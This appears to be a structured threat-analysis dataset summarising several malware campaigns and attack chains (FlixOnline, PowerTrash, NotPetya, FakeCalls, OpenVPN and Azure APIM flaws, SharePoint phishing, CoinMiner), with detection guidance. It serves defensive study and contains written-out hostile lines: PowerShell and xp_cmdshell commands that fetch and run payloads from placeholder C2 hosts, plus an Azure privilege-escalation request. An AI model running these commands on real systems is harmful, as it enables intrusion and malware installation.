package_info.why_malicious: FlixOnline is a malicious Android application that impersonates a legitimate Netflix content enabler. It abuses Android permissions to intercept WhatsApp messages, automatically replies to contacts with malicious links to propagate itself, exfiltrates sensitive user data (contacts and SMS), and can download further payloads, exhibiting worm-like self-propagation and spyware behaviors.

execution_context.trigger: At runtime, after installation and upon user granting requested permissions
execution_context.file_location: Main application code, likely within MainActivity.java or a persistent background service implementing NotificationListenerService

malicious_snippets.code_snippet: The app requests permissions to overlay on top of other apps, read and send SMS, and access WhatsApp notifications. It registers a NotificationListenerService to monitor incoming WhatsApp messages. When a WhatsApp message is received, the app automatically replies to the sender with a message containing a malicious link to download the FlixOnline APK, enabling the malware to propagate to new victims.
malicious_snippets.code_behavior: At runtime, after the user grants permissions, the code registers a NotificationListenerService to monitor WhatsApp notifications, intercepts incoming messages, and automatically sends replies containing a malicious APK download link to the sender, resulting in self-propagation and further malware distribution.

malice_analysis.why_suspicious: Intercepting and replying to WhatsApp messages without user interaction, especially with links to malicious APKs, is a clear sign of automated malware propagation and abuse of messaging platforms.
malice_analysis.violated_expectations: Legitimate Android apps do not monitor or auto-reply to WhatsApp messages, nor do they use messaging platforms to distribute malicious payloads or propagate themselves.
malice_analysis.similar_legitimate_use: Some accessibility or automation apps may interact with notifications for productivity or accessibility purposes, but they do not send unsolicited messages containing malware download links.
key_indicators: Abuse of NotificationListenerService to access WhatsApp message content
Automatic generation and sending of WhatsApp replies containing external APK download links
Requesting SYSTEM_ALERT_WINDOW (overlay) and notification access permissions without clear user benefit
Presence of code that programmatically interacts with WhatsApp notifications

Use file integrity monitoring to detect changes in key frontend templates, and employ web application firewalls or content security policies to block unauthorized script execution and outbound data exfiltration.

package_info.package_name: Popup Builder WordPress plugin (malicious Custom JS injection)

malice_analysis.why_suspicious: The code directly accesses sensitive cookie data and exfiltrates it by redirecting the user's browser to an attacker-controlled domain, which is a clear sign of credential theft.
malice_analysis.violated_expectations: Custom JS in WordPress plugins is intended to enhance site functionality or appearance, not to access sensitive data or perform unauthorized redirections to external domains.
malice_analysis.similar_legitimate_use: Legitimate redirection scripts may be used for navigation or login flows, but never to transmit cookies or sensitive data to untrusted, external domains.

Hardcoded external domain in window.location assignment
Use of <script> tag in plugin's Custom JS section

package_info.package_name: PowerTrash Loader (delivered via CVE-2022-22954 exploit chain)
package_info.package_manager: N/A (malware delivered via remote code execution, not a package manager)
package_info.package_versions: N/A (affects VMware Workspace ONE Access and related products vulnerable to CVE-2022-22954, CVE-2022-22957, CVE-2022-22958)
package_info.why_malicious: The attack chain is malicious because it exploits a critical remote code execution vulnerability (CVE-2022-22954) in VMware Workspace ONE Access and related products to execute arbitrary code, downloads and runs a highly obfuscated PowerShell loader (PowerTrash) from an attacker-controlled server, and injects a post-exploitation agent (Core Impact) into memory, enabling persistent remote control, lateral movement, and further exploitation of the compromised environment.

execution_context.trigger: runtime (triggered via remote code execution exploit)
execution_context.file_location: Injected into the vulnerable VMware service process (e.g., Identity Manager web service process memory)

malicious_snippets.code_snippet: powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<C2_SERVER>/stager.ps1')"
malicious_snippets.code_behavior: At runtime, the code is executed via remote code execution, launches a PowerShell process with no profile and hidden window, downloads a remote script from the attacker's C2 server using DownloadString, and immediately executes it in memory using Invoke-Expression (IEX), resulting in the execution of attacker-supplied code on the compromised VMware service process.

malice_analysis.why_suspicious: This command is highly suspicious because it uses PowerShell with flags to evade detection (-nop, -w hidden), downloads code from an external, attacker-controlled server, and executes it directly in memory, which is a common initial access and staging technique for malware.
malice_analysis.violated_expectations: Legitimate VMware service processes should never invoke PowerShell to download and execute remote scripts, especially with obfuscation and evasion flags.
malice_analysis.similar_legitimate_use: System administrators may use similar PowerShell commands for remote management or automation, but only in strictly controlled, logged, and authorized maintenance scenarios, never from a production VMware service process.
key_indicators: PowerShell process launched with -nop (no profile) and -w hidden (window hidden) flags
Use of DownloadString to retrieve code from an external C2 server
Immediate execution of downloaded code via Invoke-Expression (IEX)
PowerShell process parented by a VMware service process

execution_context.file_location: Process memory (downloaded and executed in-memory by the stager PowerShell script)

malicious_snippets.code_snippet: <Highly obfuscated PowerTrash loader PowerShell code, downloaded from C2 server>
malicious_snippets.code_behavior: At runtime, after the stager script executes, the highly obfuscated PowerTrash loader PowerShell code is downloaded from the attacker's C2 server and executed in memory, which then downloads the Core Impact agent and injects it into the process memory, establishing a persistent backdoor and command-and-control channel for the attacker.

malice_analysis.why_suspicious: The use of highly obfuscated PowerShell code that performs in-memory execution and process injection to load a post-exploitation agent is a hallmark of advanced malware and red team tools, designed to evade detection and maintain persistence.
malice_analysis.violated_expectations: Legitimate software should not use obfuscated scripts to perform in-memory code execution, process injection, or establish unauthorized command-and-control channels.
malice_analysis.similar_legitimate_use: Red team or penetration testing engagements may use similar techniques for authorized security assessments, but such activity should never occur in production environments without explicit authorization and monitoring.

Process injection to load a post-exploitation agent (Core Impact)
No persistent files written to disk; all activity occurs in memory
Network communication to attacker-controlled C2 infrastructure

Detect and alert on network connections from VMware servers to external IPs or domains not associated with legitimate VMware operations. package_info.package_manager: N/A (malicious Windows binaries, not a package manager ecosystem)
package_info.why_malicious: The PowerLess Backdoor and StrifeWater RAT are malicious Windows binaries used in targeted attacks. They enable covert command and control, remote code execution, and anti-forensic self-removal, employing advanced evasion techniques such as in-memory PowerShell execution to bypass security monitoring and facilitate persistent unauthorized access.

malicious_snippets.code_snippet: The .NET-based PowerLess Backdoor loads and executes PowerShell scripts directly in memory using the System.Management.Automation namespace, avoiding the creation of a powershell.exe process. This enables the malware to run arbitrary PowerShell commands for command and control, data exfiltration, and lateral movement, all while evading process-based detection.
malicious_snippets.code_behavior: At runtime, the .NET application loads and executes PowerShell scripts in memory using the System.Management.Automation API, allowing the attacker to issue remote commands and exfiltrate data over the network, resulting in covert command and control and remote code execution without spawning powershell.exe.

malice_analysis.why_suspicious: Executing PowerShell code in-memory via .NET APIs without launching powershell.exe is a sophisticated evasion technique, allowing malware to bypass endpoint monitoring solutions that rely on process creation events.
malice_analysis.violated_expectations: Legitimate .NET applications rarely embed and execute PowerShell scripts covertly in memory, especially without user interaction, explicit administrative purpose, or transparent documentation.
malice_analysis.similar_legitimate_use: Some legitimate enterprise automation tools may use in-memory PowerShell execution for advanced automation, but this is typically well-documented, user-initiated, and not hidden from process monitoring.
key_indicators: In-memory PowerShell execution via System.Management.Automation in .NET
Absence of powershell.exe process despite PowerShell activity
Outbound command and control communications from .NET process
Remote code execution capabilities embedded in .NET binary

malicious_snippets.code_snippet: The StrifeWater RAT provides remote access to the attacker, executes arbitrary commands, and includes a self-removal routine that deletes its own binary and cleans up persistence mechanisms after initial access or upon receiving a specific command from the attacker.
malicious_snippets.code_behavior: At runtime, the RAT establishes a remote connection to the attacker's command and control server, executes received commands, and, upon instruction, deletes its own executable and removes persistence artifacts from the filesystem and registry, resulting in anti-forensic self-removal and evasion of post-infection analysis.

malice_analysis.why_suspicious: The presence of a self-removal routine that deletes the RAT binary and cleans up persistence is a hallmark of anti-forensic malware, designed to erase evidence and hinder incident response.
malice_analysis.violated_expectations: Legitimate remote access or administrative tools do not erase themselves and their traces from the system without explicit user consent or clear documentation, especially after establishing remote access.
malice_analysis.similar_legitimate_use: Some legitimate installers or updaters may remove temporary files, but full self-removal of a remote access tool and its persistence mechanisms is not standard practice.
key_indicators: Self-deletion of executable upon command
Removal of registry keys and persistence artifacts
Remote command execution capability
Outbound connections to attacker-controlled infrastructure

package_info.package_versions: N/A (multiple variants targeting South Korean users)
package_info.why_malicious: The FakeCalls Android Trojan impersonates over 20 South Korean financial apps, simulates voice calls with fake bank employees using pre-recorded audio, and exfiltrates private data including audio recordings, contacts, and call logs to attacker-controlled servers. Its primary purpose is to deceive users into divulging sensitive information and to steal private data, constituting clear malicious intent.

execution_context.trigger: At runtime, when the user launches the fake banking app or receives a simulated call event
execution_context.file_location: Main activity and supporting classes within the malicious APK (e.g., com.fakecalls.MainActivity, assets/ directory for audio files)

malicious_snippets.code_behavior: At runtime, when the user opens the app or initiates a call, the code displays a fake banking interface, plays pre-recorded audio to simulate a bank employee, records the user's responses via the microphone, collects private data (contacts, call logs, device info), and exfiltrates all gathered information to a remote command-and-control server.

malice_analysis.why_suspicious: The code impersonates legitimate financial applications, simulates phone calls with fake bank employees using pre-recorded audio, records user audio without informed consent, and exfiltrates sensitive data to attacker-controlled infrastructure. These behaviors are designed to deceive users and steal confidential information.
malice_analysis.violated_expectations: A legitimate banking app should never simulate calls with fake employees, record user audio without explicit consent, or transmit private data (audio, contacts, call logs) to unknown external servers. Such actions violate user privacy and standard security practices.
malice_analysis.similar_legitimate_use: Legitimate apps may request microphone access for customer support or voice authentication, but only with clear user consent and without exfiltrating recordings or sensitive data to untrusted servers. Legitimate banking apps do not simulate employee calls using pre-recorded audio.

Simulation of voice calls using pre-recorded audio files stored in the APK assets
Unauthorized audio recording triggered during simulated calls

Its explicit behaviors—unauthorized credential harvesting, command logging, and persistent unauthorized access—are clear indicators of malicious intent.

malice_analysis.why_suspicious: Setting LD_PRELOAD globally or for system services to load a non-standard shared object is a well-known rootkit and malware technique for gaining code execution in privileged processes.
malice_analysis.violated_expectations: Legitimate software does not set LD_PRELOAD for system-wide credential interception or persistence; such use is highly atypical and indicative of malicious intent.
malice_analysis.similar_legitimate_use: Developers may use LD_PRELOAD for debugging or performance profiling in controlled environments, but never for credential interception or persistent system compromise.

package_info.why_malicious: NotPetya is a destructive malware campaign that masquerades as ransomware but is designed to cause irreversible damage. It intentionally implements broken encryption and key management, ensuring data recovery is impossible. The malware leverages multiple vulnerabilities for rapid lateral movement, including SMB exploits (EternalBlue/MS17-010) and a modified DoublePulsar backdoor, with the primary objective of wiping data and disrupting operations across entire networks.

execution_context.trigger: runtime (after initial infection and privilege escalation)

malicious_snippets.code_snippet: Custom MBR overwrite and disk encryption logic with intentionally broken key storage, rendering decryption impossible.
malicious_snippets.code_behavior: At runtime, after gaining sufficient privileges, the code overwrites the Master Boot Record (MBR) and encrypts disk sectors using a custom algorithm, discarding or corrupting the encryption key so that decryption is impossible, resulting in permanent data loss and system inoperability.

malice_analysis.why_suspicious: Overwriting the MBR and encrypting disk sectors without a recovery mechanism is a hallmark of destructive malware, as it irreversibly damages the system and data.
malice_analysis.violated_expectations: Legitimate software never overwrites the MBR or encrypts user data without providing a secure and reliable recovery mechanism for the user.
malice_analysis.similar_legitimate_use: Full disk encryption tools (e.g., BitLocker, VeraCrypt) may encrypt disks, but always provide a recovery key and never overwrite the MBR without explicit user consent.
key_indicators: Direct MBR overwrite operations
Irrecoverable disk encryption (no key storage or recovery path)
Destructive disk I/O patterns targeting system boot sectors

required_permissions: system (remote code execution on other hosts)

malicious_snippets.code_snippet: SMB exploitation logic leveraging EternalBlue (MS17-010) and DoublePulsar backdoor for lateral movement.
malicious_snippets.code_behavior: At runtime, the code scans the local network for SMBv1-enabled hosts, exploits the EternalBlue (MS17-010) vulnerability to gain remote code execution, and uses a modified DoublePulsar backdoor to deploy the NotPetya payload to new hosts, enabling rapid self-propagation across the network.

malice_analysis.why_suspicious: Automated exploitation of SMB vulnerabilities and use of backdoors for self-propagation is a classic worm/ransomware behavior, enabling uncontrolled spread without user interaction.
malice_analysis.violated_expectations: Normal software does not scan for vulnerable hosts or exploit SMB vulnerabilities to spread itself across a network.
malice_analysis.similar_legitimate_use: Penetration testing frameworks (e.g., Metasploit) may use similar exploits, but only in controlled, authorized environments with explicit consent.
key_indicators: Automated SMBv1 host scanning
Presence of EternalBlue (MS17-010) exploit code
Deployment and use of DoublePulsar backdoor for remote payload execution

network_indicators: Outbound HTTP/HTTPS connections to attacker-controlled or non-Microsoft domains after installer execution
Data uploads containing browser credential, cookie, or wallet data in POST requests
Connections to domains or IPs not associated with Microsoft during or immediately after installation
detection_knowledge.how_to_detect: Monitor for Windows installer executables downloaded from unofficial sources. Detect processes that, upon execution, access browser credential stores (e.g., Chrome's Login Data), crypto wallet directories (e.g., AppData\Roaming\Exodus), or recursively search user directories for sensitive file types, and then initiate outbound HTTP/HTTPS POST requests to unknown domains. Flag any installer that attempts to exfiltrate data immediately after installation as highly suspicious. Correlate file origin, process behavior, and network activity for comprehensive detection.

package_info.package_name: Azure API Management (APIM) legacy API endpoints
package_info.package_manager: Azure Cloud Platform (not a traditional package manager, but a managed service)
package_info.package_versions: All versions with legacy API endpoints enabled (pre-June 2024 deployments, especially those with legacy ARM API access)
package_info.why_malicious: The legacy API endpoints in Azure API Management expose a critical privilege escalation vulnerability: users with only Reader permissions can access deprecated endpoints to retrieve administrative SSO tokens. This bypasses intended access controls, allowing attackers to gain full administrative control, access sensitive data, and modify or deploy APIs. The flaw enables unauthorized privilege escalation and total compromise of the APIM service.

execution_context.trigger: API call initiated by attacker at runtime
execution_context.file_location: Legacy Azure Resource Manager (ARM) API endpoint: /providers/Microsoft.ApiManagement/service/{serviceName}/listSecrets

malicious_snippets.code_snippet: GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.ApiManagement/service/{serviceName}/listSecrets?api-version=2016-10-10
malicious_snippets.code_behavior: At runtime, the attacker issues a GET request to the deprecated /listSecrets ARM API endpoint using only Reader permissions, which results in the retrieval of an SSO token with full administrative privileges, enabling privilege escalation.

malice_analysis.why_suspicious: This API call is suspicious because it allows a user with only Reader permissions to access a deprecated endpoint and retrieve an administrative SSO token, which should be restricted to higher-privilege roles.
malice_analysis.violated_expectations: Under normal circumstances, Reader permissions should not grant access to secrets or administrative tokens. The actual behavior violates least privilege principles by enabling privilege escalation from Reader to Admin.
malice_analysis.similar_legitimate_use: A legitimate use case would involve an administrator retrieving secrets for operational needs via supported endpoints, never a Reader role or through deprecated endpoints.
key_indicators: API call to deprecated /listSecrets endpoint
Use of old API version parameter (e.g., api-version=2016-10-10)
Access to secrets or SSO tokens by accounts with Reader permissions
Audit log entries showing Reader role accessing privileged endpoints

execution_context.trigger: API call after obtaining SSO token (runtime, attacker-initiated)

malicious_snippets.code_snippet:
Authorization: Bearer {admin_sso_token}
GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.ApiManagement/service/{serviceName}/apis?api-version=2021-08-01
malicious_snippets.code_behavior: After obtaining the admin SSO token, the attacker authenticates API requests to the APIM Management API, performing administrative actions such as deploying new APIs, modifying existing APIs, and accessing all sensitive configuration data.

malice_analysis.why_suspicious: This behavior is suspicious because it leverages an SSO token obtained through privilege escalation to perform high-impact administrative actions, which should only be possible for legitimate admin users.
malice_analysis.violated_expectations: Normal API usage requires proper admin authentication for sensitive operations. Here, a Reader escalates to admin and performs unauthorized administrative actions, violating access control policies.
malice_analysis.similar_legitimate_use: A legitimate admin would use an SSO token to manage APIs, but a Reader role should never be able to obtain or use such a token for these actions.
key_indicators: Use of SSO tokens obtained via deprecated endpoints
Administrative API actions performed by accounts with no prior admin privileges
Audit logs showing privilege escalation followed by sensitive operations

attack_chain.action: Attacker with Reader permissions calls a deprecated ARM API endpoint (/listSecrets) to retrieve an administrative SSO token.
attack_chain.leads_to: Attacker obtains an admin-level SSO token, enabling privilege escalation.

attack_chain.action: Attacker uses the admin SSO token to authenticate against the APIM Management API and perform unauthorized administrative actions, such as deploying or modifying APIs and accessing secrets.
attack_chain.leads_to: Full compromise of the APIM service and access to all sensitive data and configuration.

behavioral_signatures: API calls to deprecated ARM endpoints (e.g., /listSecrets) by users with Reader permissions
Retrieval of SSO tokens or secrets by non-admin accounts
Subsequent administrative API actions (deployments, modifications, secret access) from accounts previously limited to Reader role
Audit log correlation of privilege escalation followed by sensitive operations
file_indicators: No direct file indicators (cloud API abuse), but Azure audit logs showing access to /listSecrets or similar deprecated endpoints by Reader accounts
network_indicators: Unusual API calls to management.azure.com with old API versions (e.g., api-version=2016-10-10)
Burst of administrative API calls from accounts with no prior admin activity
Sequence of network requests: deprecated endpoint access followed by privileged API operations
detection_knowledge.how_to_detect: Monitor Azure audit logs for API calls to deprecated endpoints such as /listSecrets by users with Reader permissions. Flag any retrieval of SSO tokens or secrets by non-admin accounts. Correlate subsequent administrative actions (API deployments, modifications, or secret access) performed by accounts that recently escalated privileges via legacy endpoints. Alert on use of old API versions in management API calls and on sequences where privilege escalation is followed by sensitive operations.

package_info.package_manager: N/A (native software, not a package manager)
package_info.package_versions: All versions prior to patch (exact versions not specified)
package_info.why_malicious: The vulnerabilities in OpenVPN allow attackers to execute arbitrary code with elevated privileges, impersonate privileged users, and gain kernel-level access via exploitation of the plugin mechanism, stack overflow, and a vulnerable signed driver. This enables full system compromise, making the affected OpenVPN versions critically insecure.

execution_context.file_location: OpenVPN plugin mechanism (dynamic plugin loading code)

malicious_snippets.code_behavior: At runtime during plugin loading, the code copies user-supplied plugin path data into a fixed-size stack buffer using strcpy without bounds checking, allowing an attacker to overflow the buffer and overwrite the stack, resulting in remote code execution.

malice_analysis.why_suspicious: The use of strcpy with user-controlled input into a fixed-size stack buffer is a classic stack overflow vulnerability, enabling attackers to overwrite return addresses and hijack program control flow.
malice_analysis.violated_expectations: Normal plugin loading routines should validate input length and use safe string handling functions to prevent buffer overflows. This code fails to enforce such checks, directly exposing the stack to overflow attacks.
malice_analysis.similar_legitimate_use: Legitimate plugin loading would use functions like strncpy or strlcpy and validate the length of the plugin path before copying, ensuring the buffer is not overrun.
key_indicators: strcpy usage with user input
absence of input length validation
fixed-size stack buffer manipulation
direct copy of external data to stack

execution_context.file_location: NT System service (named pipe creation code)

malicious_snippets.code_behavior: During runtime after a service crash and restart, the code attempts to create a named pipe for inter-process communication. An attacker can exploit a race condition to create the named pipe instance before the service, thereby seizing control of the resource and enabling privilege escalation.

malice_analysis.why_suspicious: Race conditions in resource creation allow attackers to preempt legitimate processes, potentially hijacking critical IPC mechanisms and escalating privileges by impersonating the service.
malice_analysis.violated_expectations: System services should securely handle resource creation and recovery, ensuring that only the legitimate service can create and own critical IPC resources like named pipes. This code lacks proper synchronization and ownership validation.
malice_analysis.similar_legitimate_use: Legitimate named pipe creation is common in system services, but should be protected by synchronization mechanisms and strict access controls to prevent external processes from preempting resource creation.
key_indicators: named pipe creation in system service context
race condition between service and attacker
lack of resource ownership or access validation
opportunity for attacker to impersonate service

malicious_snippets.code_behavior: At runtime after gaining elevated privileges, the attacker loads a known vulnerable signed driver and exploits its flaw to execute arbitrary code in kernel mode, resulting in full system compromise.

malice_analysis.why_suspicious: Loading a known vulnerable driver to escalate privileges (Bring Your Own Vulnerable Driver, BYOVD) is a well-documented attack technique that allows attackers to bypass kernel protections and execute code with the highest privileges.
malice_analysis.violated_expectations: Normal operation should only load trusted, up-to-date drivers. Loading and exploiting a vulnerable driver for privilege escalation is a clear deviation from expected behavior.
malice_analysis.similar_legitimate_use: Legitimate driver loading occurs during hardware installation or system updates, not as a means to gain kernel-level code execution.
key_indicators: loading of known vulnerable signed driver
arbitrary kernel code execution
BYOVD (Bring Your Own Vulnerable Driver) technique
driver exploitation following service compromise

attack_chain.action: Attacker exploits stack overflow in OpenVPN plugin mechanism to achieve remote code execution.
attack_chain.leads_to: Service crash and opportunity to exploit race condition.

attack_chain.action: Service crash triggers a race condition for named pipe creation, allowing attacker to seize control of the named pipe resource.
attack_chain.leads_to: Privilege escalation via impersonation.

attack_chain.action: Attacker impersonates privileged user and loads a vulnerable signed driver (BYOVD), exploiting it to execute arbitrary code at the kernel level.
attack_chain.leads_to: Full system compromise (final goal).

behavioral_signatures: Unbounded stack buffer operations in plugin loading routines (e.g., use of strcpy with user input)
Unexpected OpenVPN service crashes followed by rapid named pipe creation attempts
Loading of known vulnerable signed drivers (BYOVD) after OpenVPN service compromise
file_indicators: Unusual or unauthorized OpenVPN plugin files in plugin directories
Presence of vulnerable driver files (e.g., vulnerable_signed_driver.sys) in system driver locations
Named pipe creation attempts with OpenVPN-related names (e.g., \\.\pipe\openvpn) outside normal service operation
network_indicators: N/A (attack is local privilege escalation, but may be paired with remote C2 in real-world attacks)
detection_knowledge.how_to_detect: Monitor OpenVPN plugin loading for unsafe buffer operations and the presence of unrecognized plugins. Alert on repeated OpenVPN service crashes and rapid named pipe creation attempts, especially if the named pipe is created by a process other than the legitimate service. Detect loading of known vulnerable drivers, particularly following OpenVPN process anomalies. Use endpoint detection and response (EDR) tools to correlate these behaviors and flag potential exploitation attempts. Regularly audit plugin directories and driver installations for unauthorized files.

package_info.package_manager: N/A (Delivered via email/SharePoint, not a software package manager)
package_info.why_malicious: The attack chain abuses trusted Microsoft SharePoint infrastructure to deliver malicious PDFs containing embedded phishing links. These links redirect victims through a CAPTCHA challenge to a fake Microsoft login page, where credentials are harvested. The campaign employs evasion tactics such as conditional redirection based on visitor IP/ASN and leverages legitimate services to bypass security controls, making detection more difficult and increasing the risk of credential theft.

malicious_snippets.code_snippet: [Email body with embedded link to SharePoint-hosted PDF]
malicious_snippets.code_behavior: When the user clicks the embedded link in the phishing email, the browser initiates a network request to a SharePoint-hosted PDF, starting the phishing attack chain, and exposing the user to further malicious content.

malice_analysis.why_suspicious: Phishing emails with links to file shares, especially from unknown senders or with urgent language, are a common initial vector for credential theft. The use of SharePoint increases trust and bypasses some email security filters.
malice_analysis.violated_expectations: Legitimate file sharing notifications should originate from known contacts, match expected business processes, and not pressure the recipient to act quickly.
malice_analysis.similar_legitimate_use: Business file sharing via SharePoint or OneDrive, where links are sent to intended recipients by known senders.
key_indicators: Unexpected file sharing notification from SharePoint
Urgency or pressure tactics in email body
Sender address mismatch or spoofed sender
Embedded link to SharePoint-hosted file

malicious_snippets.code_snippet: [PDF with embedded link to external phishing site]
malicious_snippets.code_behavior: When the user opens the PDF and clicks the embedded hyperlink, the browser initiates a network request to an external phishing site, redirecting the user away from SharePoint to a malicious domain controlled by the attacker.

malice_analysis.why_suspicious: PDFs hosted on trusted platforms that contain links to unrelated, external domains are a strong indicator of phishing, especially when the destination is not affiliated with Microsoft.
malice_analysis.violated_expectations: Legitimate business PDFs should not contain links to credential harvesting sites or unrelated external domains.
malice_analysis.similar_legitimate_use: PDFs with links to legitimate business resources or documentation.
key_indicators: SharePoint-hosted PDF containing hyperlink to non-Microsoft domain
Link text or URL obfuscation to disguise destination
PDF metadata inconsistent with legitimate business documents

malicious_snippets.code_snippet: [JavaScript/HTML code for CAPTCHA challenge]
malicious_snippets.code_behavior: Upon navigation to the phishing site, the browser executes JavaScript and renders HTML to display a CAPTCHA challenge, requiring the user to solve it before allowing access to the credential harvesting page.

malice_analysis.why_suspicious: CAPTCHAs are used to block automated analysis and make the phishing site appear more legitimate, delaying detection by security tools.
malice_analysis.violated_expectations: Legitimate Microsoft login workflows do not present a CAPTCHA before the login page, especially on non-Microsoft domains.
malice_analysis.similar_legitimate_use: CAPTCHAs on high-value or sensitive login portals to prevent automated abuse.
key_indicators: CAPTCHA challenge presented before login form
CAPTCHA resources loaded from non-standard or suspicious domains
CAPTCHA implementation inconsistent with Microsoft or major providers

malicious_snippets.code_snippet: [HTML/JavaScript code mimicking Microsoft login, capturing credentials]
malicious_snippets.code_behavior: After the CAPTCHA is solved, the browser displays a fake Microsoft login form. When the user enters their credentials and submits the form, the data is captured by JavaScript and sent via HTTPS POST to an attacker-controlled endpoint, resulting in credential theft.

malice_analysis.why_suspicious: The login page visually mimics Microsoft branding but is hosted on a non-Microsoft domain, and credential submissions are sent to infrastructure controlled by the attacker.
malice_analysis.violated_expectations: Legitimate Microsoft login pages are always hosted on official Microsoft domains and use valid security certificates. Credential POSTs should only go to Microsoft endpoints.
malice_analysis.similar_legitimate_use: None; credential harvesting is always malicious.
key_indicators: Login form hosted on non-Microsoft domain
Credential POST requests to attacker-controlled endpoint
Visual mimicry of Microsoft branding and UI
Absence of valid Microsoft SSL certificate

malicious_snippets.code_snippet: [JavaScript code that checks IP/ASN and redirects to legitimate site if detected as hosting provider]
malicious_snippets.code_behavior: When the phishing site receives a request, JavaScript checks the visitor's IP address and ASN. If the visitor is identified as coming from a known hosting provider or security sandbox, the site immediately redirects the browser to a legitimate website, preventing analysis of the phishing content.

malice_analysis.why_suspicious: Conditional redirection based on IP/ASN is a strong indicator of evasion tactics, designed to avoid detection by automated security tools and sandboxes.
malice_analysis.violated_expectations: Legitimate sites do not selectively redirect users based on IP/ASN, except for compliance or geo-fencing, and never to hide malicious content.
malice_analysis.similar_legitimate_use: Geo-fencing or compliance-based access controls, but not for evasion of security analysis.
key_indicators: JavaScript logic for ASN/IP-based visitor checks
Immediate redirection to legitimate site when suspicious traffic is detected
Redirection patterns inconsistent with normal business logic

attack_chain.action: Victim receives a phishing email containing a link to a SharePoint-hosted PDF.
attack_chain.leads_to: Victim clicks the link and opens the PDF hosted on SharePoint.

attack_chain.action: Victim opens the PDF on SharePoint, which contains an embedded link to an external phishing site.
attack_chain.leads_to: Victim clicks the link in the PDF, navigating to the phishing site.

attack_chain.action: Victim is presented with a CAPTCHA challenge on the phishing site.
attack_chain.leads_to: Victim solves the CAPTCHA and is allowed to proceed.

attack_chain.action: Victim is shown a fake Microsoft login page and enters credentials.
attack_chain.leads_to: Credentials are sent to the attacker's server, resulting in credential theft.

attack_chain.action: If the phishing kit detects traffic from a hosting provider or security sandbox, it redirects to a legitimate site to evade detection.
attack_chain.leads_to: Evasion of automated or sandbox-based analysis, reducing likelihood of detection.

behavioral_signatures: SharePoint-hosted PDFs containing hyperlinks to external, non-Microsoft domains
Phishing sites presenting CAPTCHA challenges before displaying login forms
Fake Microsoft login pages hosted on non-Microsoft domains with credential POSTs to unknown endpoints
Conditional redirection logic based on visitor IP address or ASN to evade analysis
file_indicators: Unexpected PDF files shared via SharePoint with embedded links to unrelated domains
PDFs with hyperlinks where the destination domain is not affiliated with Microsoft
PDF metadata inconsistent with legitimate business documents
network_indicators: SharePoint URLs followed by immediate navigation to non-Microsoft domains
Credential POST requests from fake login pages to attacker-controlled endpoints
Redirection to legitimate sites when accessed from known hosting providers or security sandboxes
CAPTCHA resources loaded from non-standard or suspicious domains
detection_knowledge.how_to_detect: Monitor inbound emails for SharePoint links that, when followed, lead to PDFs with embedded hyperlinks to external, non-Microsoft domains. Flag any SharePoint-hosted PDFs containing links to suspicious or unrelated domains. Detect the presence of CAPTCHA challenges and login forms on non-Microsoft domains that visually mimic Microsoft branding. Analyze network traffic for credential POSTs to unknown endpoints and for redirection logic based on IP/ASN. Use sandboxing to observe the full attack chain, but account for evasion via conditional redirection. Correlate PDF metadata and sender information to identify anomalies in file sharing workflows.

package_info.package_manager: custom/standalone (not from a public package manager)
package_info.why_malicious: The Fast Reverse Proxy server software was deliberately modified and deployed by a CoinMiner threat actor to provide persistent, unauthorized remote access to compromised systems. The modifications removed authentication and exposed RDP ports, enabling both the original attacker and opportunistic ransomware actors to access and control internal hosts, facilitating lateral movement and further compromise. Its use as malicious infrastructure is evidenced by its deployment in a botnet and subsequent exploitation by multiple threat actors.

execution_context.file_location: Modified Fast Reverse Proxy server binary/configuration

malicious_snippets.code_snippet: Custom Fast Reverse Proxy configuration with exposed RDP port and no login restrictions, enabling remote access to internal botnet systems.
malicious_snippets.code_language: configuration (proxy server, likely Go or shell for deployment)
malicious_snippets.code_behavior: At runtime, the proxy server listens on an externally accessible RDP port without authentication, forwards all incoming RDP connections to internal botnet hosts, and enables unrestricted remote access and lateral movement.

malice_analysis.why_suspicious: Exposing RDP ports to the public internet without any authentication or access controls is highly abnormal and creates a critical security risk, as it allows any remote actor to access internal systems without restriction.
malice_analysis.violated_expectations: A legitimate proxy server should enforce strict access controls, require authentication for sensitive services like RDP, and never expose such services to the public internet without safeguards.
malice_analysis.similar_legitimate_use: In controlled penetration testing or temporary troubleshooting scenarios, administrators may expose services, but always with strong access controls and never in production environments or without authentication.
key_indicators: Externally exposed RDP port in proxy configuration
Absence of authentication or login restrictions in proxy settings
Proxy forwarding RDP traffic to internal botnet hosts
Configuration or binary modifications disabling access controls

malicious_snippets.code_snippet: EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://C2_SERVER/coinminer.exe -OutFile C:\Windows\Temp\coinminer.exe; Start-Process C:\Windows\Temp\coinminer.exe"';
malicious_snippets.code_behavior: At runtime, after the attacker gains administrative access to MS-SQL, the code abuses xp_cmdshell to execute a PowerShell command that downloads coinminer.exe from a remote C2 server to C:\Windows\Temp\, then launches the malware, resulting in persistent infection and C2 communication.

malice_analysis.why_suspicious: Abusing xp_cmdshell to download and execute remote binaries is a well-known malware delivery technique and is never part of normal database administration. This behavior directly introduces malware onto the system.
malice_analysis.violated_expectations: MS-SQL servers should not be used to execute arbitrary remote code or download and run untrusted binaries, especially via xp_cmdshell, which is disabled by default for security reasons.
malice_analysis.similar_legitimate_use: System administrators may use xp_cmdshell for legitimate maintenance tasks, but never to fetch and execute untrusted code from external sources.
key_indicators: xp_cmdshell invocation with PowerShell
Remote download of coinminer.exe to C:\Windows\Temp\
Immediate execution of downloaded binary
Outbound HTTP requests to attacker-controlled C2 domains

attack_chain.action: Attacker scans for MS-SQL servers with weak 'sa' credentials and gains administrative access.
attack_chain.leads_to: Malware installation via xp_cmdshell

attack_chain.action: Attacker uses xp_cmdshell to download and execute CoinMiner malware from a C2 server.
attack_chain.leads_to: Establishment of botnet and C2 infrastructure

attack_chain.action: CoinMiner group deploys a modified Fast Reverse Proxy server to control infected bots, exposing RDP port without authentication.
attack_chain.leads_to: Proxy server becomes exposed to the internet

attack_chain.action: Ransomware actor scans for exposed RDP ports, discovers the proxy server, and gains administrative access due to lack of restrictions.
attack_chain.leads_to: Lateral movement and ransomware deployment

attack_chain.action: Ransomware actor moves laterally through the botnet and deploys ransomware across the network.
attack_chain.leads_to: Network-wide ransomware infection

behavioral_signatures: Proxy servers exposing RDP or other sensitive ports to the public internet without authentication or access controls
